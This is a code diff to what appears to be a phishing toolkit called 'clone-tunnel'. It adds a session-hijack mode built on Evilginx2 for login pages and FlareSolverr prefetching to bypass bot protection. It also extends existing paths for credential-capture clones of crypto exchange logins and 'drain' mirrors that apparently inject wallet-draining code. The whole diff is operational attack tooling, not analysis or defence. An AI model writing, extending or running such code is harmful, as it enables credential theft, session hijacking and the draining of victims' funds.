@@ -54,6 +54,8 @@ import {
   runMirrorFallbackChain,
   tryDockerMirrorStack,
 } from './lib/clone-tunnel-fallback-chain.js'
+import { isSessionHijackEnabled, shouldUseSessionHijack } from './lib/integrations/adapter-chain.js'
+import { prefetchTargetViaFlareSolverr, isFlareSolverrEnabled } from './lib/integrations/flaresolverr.js'
 import {
   ensureCampaignsSchema,
   fetchComposeContainerLogs,
@@ -416,13 +418,31 @@ async function resolveCloneGeneration(
   cli: CliArgs,
   outDir: string,
 ): Promise<{
-  mode: 'mirror' | 'cex'
+  mode: 'mirror' | 'cex' | 'session_hijack'
   pipeline?: Awaited<ReturnType<typeof runMirrorProbePipeline>>
 }> {
   const target = new URL(cli.targetUrl)
   await import('node:fs/promises').then((fs) => fs.mkdir(outDir, { recursive: true }))
 
   const homepageHtml = await fetchTargetHomepageHtml(target)
+
+  let flareCookies: string | undefined
+  if (isFlareSolverrEnabled()) {
+    const flare = await prefetchTargetViaFlareSolverr(cli.targetUrl)
+    if (flare.ok && flare.cookies) flareCookies = flare.cookies
+  }
+
+  if (
+    !cli.force &&
+    shouldUseSessionHijack(cli.targetUrl, homepageHtml) &&
+    isSessionHijackEnabled()
+  ) {
+    console.error(
+      '[clone-tunnel] Login target + session hijack enabled — Evilginx2 mode (no drain inject).',
+    )
+    return { mode: 'session_hijack' }
+  }
+
   if (!cli.force && shouldUseCexClone(target, homepageHtml)) {
     console.error(
       '[clone-tunnel] Target appears to be a CEX login page – using credential capture instead of drain mirror.',
@@ -431,7 +451,10 @@ async function resolveCloneGeneration(
     return { mode: 'cex' }
   }
 
-  const pipeline = await runMirrorProbePipeline(target, outDir, { force: cli.force })
+  const pipeline = await runMirrorProbePipeline(target, outDir, {
+    force: cli.force,
+    cookieHeader: flareCookies ?? process.env['MIRROR_PROXY_COOKIES'],
+  })
 
   if (!cli.force && pipeline.strategy === 'cex') {
     console.error(
@@ -623,7 +646,24 @@ async function main(): Promise<void> {
 
   const { mode: genMode, pipeline } = await resolveCloneGeneration(cli, outDir)
 
-  if (genMode === 'cex') {
+  if (genMode === 'session_hijack') {
+    console.error('[clone-tunnel] Deploying session-hijack mirror (Evilginx2)')
+    const fallback = await runMirrorFallbackChain({
+      repoRoot: REPO_ROOT,
+      outDir,
+      targetUrl: cli.targetUrl,
+      port: mirrorHostPort,
+      godMode: cli.godMode,
+      forceHardwareBypass: cli.forceHardwareBypass,
+      backendUrl: BACKEND_URL,
+      homepageHtml: undefined,
+      runCommand,
+      generateTimeoutMs: GENERATE_TIMEOUT_MS,
+    })
+    console.error(
+      `[clone-tunnel] Session hijack ready: method=${fallback.method} stack=${fallback.stackMode}`,
+    )
+  } else if (genMode === 'cex') {
     console.error('[clone-tunnel] Deploying CEX credential-capture static clone')
     await startCexMirrorStack(outDir, cli.targetUrl)
   } else {
@@ -636,6 +676,7 @@ async function main(): Promise<void> {
       forceHardwareBypass: cli.forceHardwareBypass,
       backendUrl: BACKEND_URL,
       pipelineCookies: pipeline?.cookies,
+      homepageHtml: pipeline?.html,
       runCommand,
       generateTimeoutMs: GENERATE_TIMEOUT_MS,
     })
